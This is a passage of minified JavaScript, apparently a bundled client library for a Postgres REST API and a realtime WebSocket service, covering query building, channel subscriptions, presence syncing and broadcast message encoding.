He({method:a,url:i,headers:l,schema:this.schema,fetch:this.fetch,urlLengthLimit:this.urlLengthLimit})}insert(e){let{count:t,defaultToNull:n=!0}=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};var r;const{url:a,headers:s}=this.cloneRequestState();if(t&&s.append("Prefer","count=".concat(t)),n||s.append("Prefer","missing=default"),Array.isArray(e)){const t=e.reduce((e,t)=>e.concat(Object.keys(t)),[]);if(t.length>0){const e=[...new Set(t)].map(e=>'"'.concat(e,'"'));a.searchParams.set("columns",e.join(","))}}return new He({method:"POST",url:a,headers:s,schema:this.schema,body:e,fetch:null!==(r=this.fetch)&&void 0!==r?r:fetch,urlLengthLimit:this.urlLengthLimit})}upsert(e){let{onConflict:t,ignoreDuplicates:n=!1,count:r,defaultToNull:a=!0}=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};var s;const{url:o,headers:i}=this.cloneRequestState();if(i.append("Prefer","resolution=".concat(n?"ignore":"merge","-duplicates")),void 0!==t&&o.searchParams.set("on_conflict",t),r&&i.append("Prefer","count=".concat(r)),a||i.append("Prefer","missing=default"),Array.isArray(e)){const t=e.reduce((e,t)=>e.concat(Object.keys(t)),[]);if(t.length>0){const e=[...new Set(t)].map(e=>'"'.concat(e,'"'));o.searchParams.set("columns",e.join(","))}}return new He({method:"POST",url:o,headers:i,schema:this.schema,body:e,fetch:null!==(s=this.fetch)&&void 0!==s?s:fetch,urlLengthLimit:this.urlLengthLimit})}update(e){let{count:t}=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};var n;const{url:r,headers:a}=this.cloneRequestState();return t&&a.append("Prefer","count=".concat(t)),new He({method:"PATCH",url:r,headers:a,schema:this.schema,body:e,fetch:null!==(n=this.fetch)&&void 0!==n?n:fetch,urlLengthLimit:this.urlLengthLimit})}delete(){let{count:e}=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};var t;const{url:n,headers:r}=this.cloneRequestState();return e&&r.append("Prefer","count=".concat(e)),new He({method:"DELETE",url:n,headers:r,schema:this.schema,fetch:null!==(t=this.fetch)&&void 0!==t?t:fetch,urlLengthLimit:this.urlLengthLimit})}};function Ge(e){return(Ge="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e})(e)}function Je(e){var t=function(e,t){if("object"!=Ge(e)||!e)return e;var n=e[Symbol.toPrimitive];if(void 0!==n){var r=n.call(e,t||"default");if("object"!=Ge(r))return r;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===t?String:Number)(e)}(e,"string");return"symbol"==Ge(t)?t:t+""}function $e(e,t,n){return(t=Je(t))in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function Qe(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter(function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable})),n.push.apply(n,r)}return n}function Ye(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?Qe(Object(n),!0).forEach(function(t){$e(e,t,n[t])}):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):Qe(Object(n)).forEach(function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))})}return e}var Xe=class e{constructor(e){let{headers:t={},schema:n,fetch:r,timeout:a,urlLengthLimit:s=8e3}=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};this.url=e,this.headers=new Headers(t),this.schemaName=n,this.urlLengthLimit=s;const o=null!==r&&void 0!==r?r:globalThis.fetch;this.fetch=void 0!==a&&a>0?(e,t)=>{const n=new AbortController,r=setTimeout(()=>n.abort(),a),s=null===t||void 0===t?void 0:t.signal;if(s){if(s.aborted)return clearTimeout(r),o(e,t);const a=()=>{clearTimeout(r),n.abort()};return s.addEventListener("abort",a,{once:!0}),o(e,Ye(Ye({},t),{},{signal:n.signal})).finally(()=>{clearTimeout(r),s.removeEventListener("abort",a)})}return o(e,Ye(Ye({},t),{},{signal:n.signal})).finally(()=>clearTimeout(r))}:o}from(e){if(!e||"string"!==typeof e||""===e.trim())throw new Error("Invalid relation name: relation must be a non-empty string.");return new Ke(new URL("".concat(this.url,"/").concat(e)),{headers:new Headers(this.headers),schema:this.schemaName,fetch:this.fetch,urlLengthLimit:this.urlLengthLimit})}schema(t){return new e(this.url,{headers:this.headers,schema:t,fetch:this.fetch,urlLengthLimit:this.urlLengthLimit})}rpc(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},{head:n=!1,get:r=!1,count:a}=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{};var s;let o;const i=new URL("".concat(this.url,"/rpc/").concat(e));let l;const c=e=>null!==e&&"object"===typeof e&&(!Array.isArray(e)||e.some(c)),u=n&&Object.values(t).some(c);u?(o="POST",l=t):n||r?(o=n?"HEAD":"GET",Object.entries(t).filter(e=>{let[t,n]=e;return void 0!==n}).map(e=>{let[t,n]=e;return[t,Array.isArray(n)?"{".concat(n.join(","),"}"):"".concat(n)]}).forEach(e=>{let[t,n]=e;i.searchParams.append(t,n)})):(o="POST",l=t);const d=new Headers(this.headers);return u?d.set("Prefer",a?"count=".concat(a,",return=minimal"):"return=minimal"):a&&d.set("Prefer","count=".concat(a)),new He({method:o,url:i,headers:d,schema:this.schemaName,body:l,fetch:null!==(s=this.fetch)&&void 0!==s?s:fetch,urlLengthLimit:this.urlLengthLimit})}};const Ze=class{constructor(){}static detectEnvironment(){var e;if("undefined"!==typeof WebSocket)return{type:"native",constructor:WebSocket};if("undefined"!==typeof globalThis&&"undefined"!==typeof globalThis.WebSocket)return{type:"native",constructor:globalThis.WebSocket};if("undefined"!==typeof n.g&&"undefined"!==typeof n.g.WebSocket)return{type:"native",constructor:n.g.WebSocket};if("undefined"!==typeof globalThis&&"undefined"!==typeof globalThis.WebSocketPair&&"undefined"===typeof globalThis.WebSocket)return{type:"cloudflare",error:"Cloudflare Workers detected. WebSocket clients are not supported in Cloudflare Workers.",workaround:"Use Cloudflare Workers WebSocket API for server-side WebSocket handling, or deploy to a different runtime."};if("undefined"!==typeof globalThis&&globalThis.EdgeRuntime||"undefined"!==typeof navigator&&(null===(e=navigator.userAgent)||void 0===e?void 0:e.includes("Vercel-Edge")))return{type:"unsupported",error:"Edge runtime detected (Vercel Edge/Netlify Edge). WebSockets are not supported in edge functions.",workaround:"Use serverless functions or a different deployment target for WebSocket functionality."};const t=globalThis.process;if(t){const e=t.versions;if(e&&e.node){const t=e.node,n=parseInt(t.replace(/^v/,"").split(".")[0]);return n>=22?"undefined"!==typeof globalThis.WebSocket?{type:"native",constructor:globalThis.WebSocket}:{type:"unsupported",error:"Node.js ".concat(n," detected but native WebSocket not found."),workaround:"Provide a WebSocket implementation via the transport option."}:{type:"unsupported",error:"Node.js ".concat(n," detected without native WebSocket support."),workaround:'For Node.js < 22, install "ws" package and provide it via the transport option:\nimport ws from "ws"\nnew RealtimeClient(url, { transport: ws })'}}}return{type:"unsupported",error:"Unknown JavaScript runtime without WebSocket support.",workaround:"Ensure you're running in a supported environment (browser, Node.js, Deno) or provide a custom WebSocket implementation."}}static getWebSocketConstructor(){const e=this.detectEnvironment();if(e.constructor)return e.constructor;let t=e.error||"WebSocket not supported in this environment.";throw e.workaround&&(t+="\n\nSuggested solution: ".concat(e.workaround)),new Error(t)}static createWebSocket(e,t){return new(this.getWebSocketConstructor())(e,t)}static isWebSocketSupported(){try{const e=this.detectEnvironment();return"native"===e.type||"ws"===e.type}catch(e){return!1}}};const et="realtime-js/".concat("2.97.0"),tt="2.0.0",nt=tt,rt=1e4;var at,st,ot,it,lt,ct;!function(e){e[e.connecting=0]="connecting",e[e.open=1]="open",e[e.closing=2]="closing",e[e.closed=3]="closed"}(at||(at={})),function(e){e.closed="closed",e.errored="errored",e.joined="joined",e.joining="joining",e.leaving="leaving"}(st||(st={})),function(e){e.close="phx_close",e.error="phx_error",e.join="phx_join",e.reply="phx_reply",e.leave="phx_leave",e.access_token="access_token"}(ot||(ot={})),function(e){e.websocket="websocket"}(it||(it={})),function(e){e.Connecting="connecting",e.Open="open",e.Closing="closing",e.Closed="closed"}(lt||(lt={}));class ut{constructor(e){this.HEADER_LENGTH=1,this.USER_BROADCAST_PUSH_META_LENGTH=6,this.KINDS={userBroadcastPush:3,userBroadcast:4},this.BINARY_ENCODING=0,this.JSON_ENCODING=1,this.BROADCAST_EVENT="broadcast",this.allowedMetadataKeys=[],this.allowedMetadataKeys=null!==e&&void 0!==e?e:[]}encode(e,t){if(e.event===this.BROADCAST_EVENT&&!(e.payload instanceof ArrayBuffer)&&"string"===typeof e.payload.event)return t(this._binaryEncodeUserBroadcastPush(e));let n=[e.join_ref,e.ref,e.topic,e.event,e.payload];return t(JSON.stringify(n))}_binaryEncodeUserBroadcastPush(e){var t;return this._isArrayBuffer(null===(t=e.payload)||void 0===t?void 0:t.payload)?this._encodeBinaryUserBroadcastPush(e):this._encodeJsonUserBroadcastPush(e)}_encodeBinaryUserBroadcastPush(e){var t,n;const r=null!==(n=null===(t=e.payload)||void 0===t?void 0:t.payload)&&void 0!==n?n:new ArrayBuffer(0);return this._encodeUserBroadcastPush(e,this.BINARY_ENCODING,r)}_encodeJsonUserBroadcastPush(e){var t,n;const r=null!==(n=null===(t=e.payload)||void 0===t?void 0:t.payload)&&void 0!==n?n:{},a=(new TextEncoder).encode(JSON.stringify(r)).buffer;return this._encodeUserBroadcastPush(e,this.JSON_ENCODING,a)}_encodeUserBroadcastPush(e,t,n){var r,a;const s=e.topic,o=null!==(r=e.ref)&&void 0!==r?r:"",i=null!==(a=e.join_ref)&&void 0!==a?a:"",l=e.payload.event,c=this.allowedMetadataKeys?this._pick(e.payload,this.allowedMetadataKeys):{},u=0===Object.keys(c).length?"":JSON.stringify(c);if(i.length>255)throw new Error("joinRef length ".concat(i.length," exceeds maximum of 255"));if(o.length>255)throw new Error("ref length ".concat(o.length," exceeds maximum of 255"));if(s.length>255)throw new Error("topic length ".concat(s.length," exceeds maximum of 255"));if(l.length>255)throw new Error("userEvent length ".concat(l.length," exceeds maximum of 255"));if(u.length>255)throw new Error("metadata length ".concat(u.length," exceeds maximum of 255"));const d=this.USER_BROADCAST_PUSH_META_LENGTH+i.length+o.length+s.length+l.length+u.length,h=new ArrayBuffer(this.HEADER_LENGTH+d);let f=new DataView(h),p=0;f.setUint8(p++,this.KINDS.userBroadcastPush),f.setUint8(p++,i.length),f.setUint8(p++,o.length),f.setUint8(p++,s.length),f.setUint8(p++,l.length),f.setUint8(p++,u.length),f.setUint8(p++,t),Array.from(i,e=>f.setUint8(p++,e.charCodeAt(0))),Array.from(o,e=>f.setUint8(p++,e.charCodeAt(0))),Array.from(s,e=>f.setUint8(p++,e.charCodeAt(0))),Array.from(l,e=>f.setUint8(p++,e.charCodeAt(0))),Array.from(u,e=>f.setUint8(p++,e.charCodeAt(0)));var m=new Uint8Array(h.byteLength+n.byteLength);return m.set(new Uint8Array(h),0),m.set(new Uint8Array(n),h.byteLength),m.buffer}decode(e,t){if(this._isArrayBuffer(e)){return t(this._binaryDecode(e))}if("string"===typeof e){const n=JSON.parse(e),[r,a,s,o,i]=n;return t({join_ref:r,ref:a,topic:s,event:o,payload:i})}return t({})}_binaryDecode(e){const t=new DataView(e),n=t.getUint8(0),r=new TextDecoder;if(n===this.KINDS.userBroadcast)return this._decodeUserBroadcast(e,t,r)}_decodeUserBroadcast(e,t,n){const r=t.getUint8(1),a=t.getUint8(2),s=t.getUint8(3),o=t.getUint8(4);let i=this.HEADER_LENGTH+4;const l=n.decode(e.slice(i,i+r));i+=r;const c=n.decode(e.slice(i,i+a));i+=a;const u=n.decode(e.slice(i,i+s));i+=s;const d=e.slice(i,e.byteLength),h=o===this.JSON_ENCODING?JSON.parse(n.decode(d)):d,f={type:this.BROADCAST_EVENT,event:c,payload:h};return s>0&&(f.meta=JSON.parse(u)),{join_ref:null,ref:null,topic:l,event:this.BROADCAST_EVENT,payload:f}}_isArrayBuffer(e){var t;return e instanceof ArrayBuffer||"ArrayBuffer"===(null===(t=null===e||void 0===e?void 0:e.constructor)||void 0===t?void 0:t.name)}_pick(e,t){return e&&"object"===typeof e?Object.fromEntries(Object.entries(e).filter(e=>{let[n]=e;return t.includes(n)})):{}}}class dt{constructor(e,t){this.callback=e,this.timerCalc=t,this.timer=void 0,this.tries=0,this.callback=e,this.timerCalc=t}reset(){this.tries=0,clearTimeout(this.timer),this.timer=void 0}scheduleTimeout(){clearTimeout(this.timer),this.timer=setTimeout(()=>{this.tries=this.tries+1,this.callback()},this.timerCalc(this.tries+1))}}!function(e){e.abstime="abstime",e.bool="bool",e.date="date",e.daterange="daterange",e.float4="float4",e.float8="float8",e.int2="int2",e.int4="int4",e.int4range="int4range",e.int8="int8",e.int8range="int8range",e.json="json",e.jsonb="jsonb",e.money="money",e.numeric="numeric",e.oid="oid",e.reltime="reltime",e.text="text",e.time="time",e.timestamp="timestamp",e.timestamptz="timestamptz",e.timetz="timetz",e.tsrange="tsrange",e.tstzrange="tstzrange"}(ct||(ct={}));const ht=function(e,t){var n;const r=null!==(n=(arguments.length>2&&void 0!==arguments[2]?arguments[2]:{}).skipTypes)&&void 0!==n?n:[];return t?Object.keys(t).reduce((n,a)=>(n[a]=ft(a,e,t,r),n),{}):{}},ft=(e,t,n,r)=>{const a=t.find(t=>t.name===e),s=null===a||void 0===a?void 0:a.type,o=n[e];return s&&!r.includes(s)?pt(s,o):mt(o)},pt=(e,t)=>{if("_"===e.charAt(0)){const n=e.slice(1,e.length);return bt(t,n)}switch(e){case ct.bool:return gt(t);case ct.float4:case ct.float8:case ct.int2:case ct.int4:case ct.int8:case ct.numeric:case ct.oid:return vt(t);case ct.json:case ct.jsonb:return yt(t);case ct.timestamp:return wt(t);case ct.abstime:case ct.date:case ct.daterange:case ct.int4range:case ct.int8range:case ct.money:case ct.reltime:case ct.text:case ct.time:case ct.timestamptz:case ct.timetz:case ct.tsrange:case ct.tstzrange:default:return mt(t)}},mt=e=>e,gt=e=>{switch(e){case"t":return!0;case"f":return!1;default:return e}},vt=e=>{if("string"===typeof e){const t=parseFloat(e);if(!Number.isNaN(t))return t}return e},yt=e=>{if("string"===typeof e)try{return JSON.parse(e)}catch(t){return e}return e},bt=(e,t)=>{if("string"!==typeof e)return e;const n=e.length-1,r=e[n];if("{"===e[0]&&"}"===r){let r;const s=e.slice(1,n);try{r=JSON.parse("["+s+"]")}catch(a){r=s?s.split(","):[]}return r.map(e=>pt(t,e))}return e},wt=e=>"string"===typeof e?e.replace(" ","T"):e,_t=e=>{const t=new URL(e);return t.protocol=t.protocol.replace(/^ws/i,"http"),t.pathname=t.pathname.replace(/\/+$/,"").replace(/\/socket\/websocket$/i,"").replace(/\/socket$/i,"").replace(/\/websocket$/i,""),""===t.pathname||"/"===t.pathname?t.pathname="/api/broadcast":t.pathname=t.pathname+"/api/broadcast",t.href};class kt{constructor(e,t){let n=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{},r=arguments.length>3&&void 0!==arguments[3]?arguments[3]:rt;this.channel=e,this.event=t,this.payload=n,this.timeout=r,this.sent=!1,this.timeoutTimer=void 0,this.ref="",this.receivedResp=null,this.recHooks=[],this.refEvent=null}resend(e){this.timeout=e,this._cancelRefEvent(),this.ref="",this.refEvent=null,this.receivedResp=null,this.sent=!1,this.send()}send(){this._hasReceived("timeout")||(this.startTimeout(),this.sent=!0,this.channel.socket.push({topic:this.channel.topic,event:this.event,payload:this.payload,ref:this.ref,join_ref:this.channel._joinRef()}))}updatePayload(e){this.payload=Object.assign(Object.assign({},this.payload),e)}receive(e,t){var n;return this._hasReceived(e)&&t(null===(n=this.receivedResp)||void 0===n?void 0:n.response),this.recHooks.push({status:e,callback:t}),this}startTimeout(){if(this.timeoutTimer)return;this.ref=this.channel.socket._makeRef(),this.refEvent=this.channel._replyEventName(this.ref);this.channel._on(this.refEvent,{},e=>{this._cancelRefEvent(),this._cancelTimeout(),this.receivedResp=e,this._matchReceive(e)}),this.timeoutTimer=setTimeout(()=>{this.trigger("timeout",{})},this.timeout)}trigger(e,t){this.refEvent&&this.channel._trigger(this.refEvent,{status:e,response:t})}destroy(){this._cancelRefEvent(),this._cancelTimeout()}_cancelRefEvent(){this.refEvent&&this.channel._off(this.refEvent,{})}_cancelTimeout(){clearTimeout(this.timeoutTimer),this.timeoutTimer=void 0}_matchReceive(e){let{status:t,response:n}=e;this.recHooks.filter(e=>e.status===t).forEach(e=>e.callback(n))}_hasReceived(e){return this.receivedResp&&this.receivedResp.status===e}}var xt,St,Et,jt;!function(e){e.SYNC="sync",e.JOIN="join",e.LEAVE="leave"}(xt||(xt={}));class Tt{constructor(e,t){this.channel=e,this.state={},this.pendingDiffs=[],this.joinRef=null,this.enabled=!1,this.caller={onJoin:()=>{},onLeave:()=>{},onSync:()=>{}};const n=(null===t||void 0===t?void 0:t.events)||{state:"presence_state",diff:"presence_diff"};this.channel._on(n.state,{},e=>{const{onJoin:t,onLeave:n,onSync:r}=this.caller;this.joinRef=this.channel._joinRef(),this.state=Tt.syncState(this.state,e,t,n),this.pendingDiffs.forEach(e=>{this.state=Tt.syncDiff(this.state,e,t,n)}),this.pendingDiffs=[],r()}),this.channel._on(n.diff,{},e=>{const{onJoin:t,onLeave:n,onSync:r}=this.caller;this.inPendingSyncState()?this.pendingDiffs.push(e):(this.state=Tt.syncDiff(this.state,e,t,n),r())}),this.onJoin((e,t,n)=>{this.channel._trigger("presence",{event:"join",key:e,currentPresences:t,newPresences:n})}),this.onLeave((e,t,n)=>{this.channel._trigger("presence",{event:"leave",key:e,currentPresences:t,leftPresences:n})}),this.onSync(()=>{this.channel._trigger("presence",{event:"sync"})})}static syncState(e,t,n,r){const a=this.cloneDeep(e),s=this.transformState(t),o={},i={};return this.map(a,(e,t)=>{s[e]||(i[e]=t)}),this.map(s,(e,t)=>{const n=a[e];if(n){const r=t.map(e=>e.presence_ref),a=n.map(e=>e.presence_ref),s=t.filter(e=>a.indexOf(e.presence_ref)<0),l=n.filter(e=>r.indexOf(e.presence_ref)<0);s.length>0&&(o[e]=s),l.length>0&&(i[e]=l)}else o[e]=t}),this.syncDiff(a,{joins:o,leaves:i},n,r)}static syncDiff(e,t,n,r){const{joins:a,leaves:s}={joins:this.transformState(t.joins),leaves:this.transformState(t.leaves)};return n||(n=()=>{}),r||(r=()=>{}),this.map(a,(t,r)=>{var a;const s=null!==(a=e[t])&&void 0!==a?a:[];if(e[t]=this.cloneDeep(r),s.length>0){const n=e[t].map(e=>e.presence_ref),r=s.filter(e=>n.indexOf(e.presence_ref)<0);e[t].unshift(...r)}n(t,s,r)}),this.map(s,(t,n)=>{let a=e[t];if(!a)return;const s=n.map(e=>e.presence_ref);a=a.filter(e=>s.indexOf(e.presence_ref)<0),e[t]=a,r(t,a,n),0===a.length&&delete e[t]}),e}static map(e,t){return Object.getOwnPropertyNames(e).map(n=>t(n,e[n]))}static transformState(e){return e=this.cloneDeep(e),Object.getOwnPropertyNames(e).reduce((t,n)=>{const r=e[n];return t[n]="metas"in r?r.metas.map(e=>(e.presence_ref=e.phx_ref,delete e.phx_ref,delete e.phx_ref_prev,e)):r,t},{})}static cloneDeep(e){return JSON.parse(JSON.stringify(e))}onJoin(e){this.caller.onJoin=e}onLeave(e){this.caller.onLeave=e}onSync(e){this.caller.onSync=e}inPendingSyncState(){return!this.joinRef||this.joinRef!==this.channel._joinRef()}}!function(e){e.ALL="*",e.INSERT="INSERT",e.UPDATE="UPDATE",e.DELETE="DELETE"}(St||(St={})),function(e){e.BROADCAST="broadcast",e.PRESENCE="presence",e.POSTGRES_CHANGES="postgres_changes",e.SYSTEM="system"}(Et||(Et={})),function(e){e.SUBSCRIBED="SUBSCRIBED",e.TIMED_OUT="TIMED_OUT",e.CLOSED="CLOSED",e.CHANNEL_ERROR="CHANNEL_ERROR"}(jt||(jt={}));class Ct{constructor(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{config:{}},n=arguments.length>2?arguments[2]:void 0;var r,a;if(this.topic=e,this.params=t,this.socket=n,this.bindings={},this.state=st.closed,this.joinedOnce=!1,this.pushBuffer=[],this.subTopic=e.replace(/^realtime:/i,""),this.params.config=Object.assign({broadcast:{ack:!1,self:!1},presence:{key:"",enabled:!1},private:!1},t.config),this.timeout=this.socket.timeout,this.joinPush=new kt(this,ot.join,this.params,this.timeout),this.rejoinTimer=new dt(()=>this._rejoinUntilConnected(),this.socket.reconnectAfterMs),this.joinPush.receive("ok",()=>{this.state=st.joined,this.rejoinTimer.reset(),this.pushBuffer.forEach(e=>e.send()),this.pushBuffer=[]}),this._onClose(()=>{this.rejoinTimer.reset(),this.socket.log("channel","close ".concat(this.topic," ").concat(this._joinRef())),this.state=st.closed,this.socket._remove(this)}),this._onError(e=>{this._isLeaving()||this._isClosed()||(this.socket.log("channel","error ".concat(this.topic),e),this.state=st.errored,this.rejoinTimer.scheduleTimeout())}),this.joinPush.receive("timeout",()=>{this._isJoining()&&(this.socket.log("channel","timeout ".concat(this.topic),this.joinPush.timeout),this.state=st.errored,this.rejoinTimer.scheduleTimeout())}),this.joinPush.receive("error",e=>{this._isLeaving()||this._isClosed()||(this.socket.log("channel","error ".concat(this.topic),e),this.state=st.errored,this.rejoinTimer.scheduleTimeout())}),this._on(ot.reply,{},(e,t)=>{this._trigger(this._replyEventName(t),e)}),this.presence=new Tt(this),this.broadcastEndpointURL=_t(this.socket.endPoint),this.private=this.params.config.private||!1,!this.private&&(null===(a=null===(r=this.params.config)||void 0===r?void 0:r.broadcast)||void 0===a?void 0:a.replay))throw"tried to use replay on public channel '".concat(this.topic,"'. It must be a private channel.")}subscribe(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:this.timeout;var n,r,a;if(this.socket.isConnected()||this.socket.connect(),this.state==st.closed){const{config:{broadcast:s,presence:o,private:i}}=this.params,l=null!==(r=null===(n=this.bindings.postgres_changes)||void 0===n?void 0:n.map(e=>e.filter))&&void 0!==r?r:[],c=!!this.bindings[Et.PRESENCE]&&this.bindings[Et.PRESENCE].length>0||!0===(null===(a=this.params.config.presence)||void 0===a?void 0:a.enabled),u={},d={broadcast:s,presence:Object.assign(Object.assign({},o),{enabled:c}),postgres_changes:l,private:i};this.socket.accessTokenValue&&(u.access_token=this.socket.accessTokenValue),this._onError(t=>null===e||void 0===e?void 0:e(jt.CHANNEL_ERROR,t)),this._onClose(()=>null===e||void 0===e?void 0:e(jt.CLOSED)),this.updateJoinPayload(Object.assign({config:d},u)),this.joinedOnce=!0,this._rejoin(t),this.joinPush.receive("ok",async t=>{let{postgres_changes:n}=t;var r;if(this.socket._isManualToken()||this.socket.setAuth(),void 0!==n){const t=this.bindings.postgres_changes,a=null!==(r=null===t||void 0===t?void 0:t.length)&&void 0!==r?r:0,s=[];for(let r=0;r<a;r++){const a=t[r],{filter:{event:o,schema:i,table:l,filter:c}}=a,u=n&&n[r];if(!(u&&u.event===o&&Ct.isFilterValueEqual(u.schema,i)&&Ct.isFilterValueEqual(u.table,l)&&Ct.isFilterValueEqual(u.filter,c)))return this.unsubscribe(),this.state=st.errored,void(null===e||void 0===e||e(jt.CHANNEL_ERROR,new Error("mismatch between server and client bindings for postgres changes")));s.push(Object.assign(Object.assign({},a),{id:u.id}))}return this.bindings.postgres_changes=s,void(e&&e(jt.SUBSCRIBED))}null===e||void 0===e||e(jt.SUBSCRIBED)}).receive("error",t=>{this.state=st.errored,null===e||void 0===e||e(jt.CHANNEL_ERROR,new Error(JSON.stringify(Object.values(t).join(", ")||"error")))}).receive("timeout",()=>{null===e||void 0===e||e(jt.TIMED_OUT)})}return this}presenceState(){return this.presence.state}async track(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};return await this.send({type:"presence",event:"track",payload:e},t.timeout||this.timeout)}async untrack(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};return await this.send({type:"presence",event:"untrack"},e)}on(e,t,n){return this.state===st.joined&&e===Et.PRESENCE&&(this.socket.log("channel","resubscribe to ".concat(this.topic," due to change in presence callbacks on joined channel")),this.unsubscribe().then(async()=>await this.subscribe())),this._on(e,t,n)}async httpSend(e,t){let n=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{};var r;if(void 0===t||null===t)return Promise.reject("Payload is required for httpSend()");const a={apikey:this.socket.apiKey?this.socket.apiKey:"","Content-Type":"application/json"};this.socket.accessTokenValue&&(a.Authorization="Bearer ".concat(this.socket.accessTokenValue));const s={method:"POST",headers:a,body:JSON.stringify({messages:[{topic:this.subTopic,event:e,payload:t,private:this.private}]})},o=await this._fetchWithTimeout(this.broadcastEndpointURL,s,null!==(r=n.timeout)&&void 0!==r?r:this.timeout);if(202===o.status)return{success:!0};let i=o.statusText;try{const e=await o.json();i=e.error||e.message||i}catch(l){}return Promise.reject(new Error(i))}async send(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};var n,r;if(this._canPush()||"broadcast"!==e.type)return new Promise(n=>{var r,a,s;const o=this._push(e.type,e,t.timeout||this.timeout);"broadcast"!==e.type||(null===(s=null===(a=null===(r=this.params)||void 0===r?void 0:r.config)||void 0===a?void 0:a.broadcast)||void 0===s?void 0:s.ack)||n("ok"),o.receive("ok",()=>n("ok")),o.receive("error",()=>n("error")),o.receive("timeout",()=>n("timed out"))});{console.warn("Realtime send() is automatically falling back to REST API. This behavior will be deprecated in the future. Please use httpSend() explicitly for REST delivery.");const{event:s,payload:o}=e,i={apikey:this.socket.apiKey?this.socket.apiKey:"","Content-Type":"application/json"};this.socket.accessTokenValue&&(i.Authorization="Bearer ".concat(this.socket.accessTokenValue));const l={method:"POST",headers:i,body:JSON.stringify({messages:[{topic:this.subTopic,event:s,payload:o,private:this.private}]})};try{const e=await this._fetchWithTimeout(this.broadcastEndpointURL,l,null!==(n=t.timeout)&&void 0!==n?n:this.timeout);return await(null===(r=e.body)||void 0===r?void 0:r.cancel()),e.ok?"ok":"error"}catch(a){return"AbortError"===a.name?"timed out":"error"}}}updateJoinPayload(e){this.joinPush.updatePayload(e)}unsubscribe(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:this.timeout;this.state=st.leaving;const t=()=>{this.socket.log("channel","leave ".concat(this.topic)),this._trigger(ot.close,"leave",this._joinRef())};this.joinPush.destroy();let n=null;return new Promise(r=>{n=new kt(this,ot.leave,{},e),n.receive("ok",()=>{t(),r("ok")}).receive("timeout",()=>{t(),r("timed out")}).receive("error",()=>{r("error")}),n.send(),this._canPush()||n.trigger("ok",{})}).finally(()=>{null===n||void 0===n||n.destroy()})}teardown(){this.pushBuffer.forEach(e=>e.destroy()),this.pushBuffer=[],this.rejoinTimer.reset(),this.joinPush.destroy(),this.state=st.closed,this.bindings={}}async _fetchWithTimeout(e,t,n){const r=new AbortController,a=setTimeout(()=>r.abort(),n),s=await this.socket.fetch(e,Object.assign(Object.assign({},t),{signal:r.signal}));return clearTimeout(a),s}_push(e,t){let n=arguments.length>2&&void 0!==arguments[2]?arguments[2]:this.timeout;if(!this.joinedOnce)throw"tried to push '".concat(e,"' to '").concat(this.topic,"' before joining. Use channel.subscribe() before pushing events");let r=new kt(this,e,t,n);return this._canPush()?r.send():this._addToPushBuffer(r),r}_addToPushBuffer(e){if(e.startTimeout(),this.pushBuffer.push(e),this.pushBuffer.length>100){const e=this.pushBuffer.shift();e&&(e.destroy(),this.socket.log("channel","discarded push due to buffer overflow: ".concat(e.event),e.payload))}}_onMessage(e,t,n){return t}_isMember(e){return this.topic===e}_joinRef(){return this.joinPush.ref}_trigger(e,t,n){var r,a;const s=e.toLocaleLowerCase(),{close:o,error:i,leave:l,join:c}=ot;if(n&&[o,i,l,c].indexOf(s)>=0&&n!==this._joinRef())return;let u=this._onMessage(s,t,n);if(t&&!u)throw"channel onMessage callbacks must return the payload, modified or unmodified";["insert","update","delete"].includes(s)?null===(r=this.bindings.postgres_changes)||void 0===r||r.filter(e=>{var t,n,r;return"*"===(null===(t=e.filter)||void 0===t?void 0:t.event)||(null===(r=null===(n=e.filter)||void 0===n?void 0:n.event)||void 0===r?void 0:r.toLocaleLowerCase())===s}).map(e=>e.callback(u,n)):null===(a=this.bindings[s])||void 0===a||a.filter(e=>{var n,r,a,o,i,l;if(["broadcast","presence","postgres_changes"].includes(s)){if("id"in e){const s=e.id,o=null===(n=e.filter)||void 0===n?void 0:n.event;return s&&(null===(r=t.ids)||void 0===r?void 0:r.includes(s))&&("*"===o||(null===o||void 0===o?void 0:o.toLocaleLowerCase())===(null===(a=t.data)||void 0===a?void 0:a.type.toLocaleLowerCase()))}{const n=null===(i=null===(o=null===e||void 0===e?void 0:e.filter)||void 0===o?void 0:o.event)||void 0===i?void 0:i.toLocaleLowerCase();return"*"===n||n===(null===(l=null===t||void 0===t?void 0:t.event)||void 0===l?void 0:l.toLocaleLowerCase())}}return e.type.toLocaleLowerCase()===s}).map(e=>{if("object"===typeof u&&"ids"in u){const e=u.data,{schema:t,table:n,commit_timestamp:r,type:a,errors:s}=e,o={schema:t,table:n,commit_timestamp:r,eventType:a,new:{},old:{},errors:s};u=Object.assign(Object.assign({},o),this._getPayloadRecords(e))}e.callback(u,n)})}_isClosed(){return this.state===st.closed}_isJoined(){return this.state===st.joined}_isJoining(){return this.state===st.joining}_isLeaving(){return this.state===st.leaving}_replyEventName(e){return"chan_reply_".concat(e)}_on(e,t,n){const r=e.toLocaleLowerCase(),a={type:r,filter:t,callback:n};return this.bindings[r]?this.bindings[r].push(a):this.bindings[r]=[a],this}_off(e,t){const 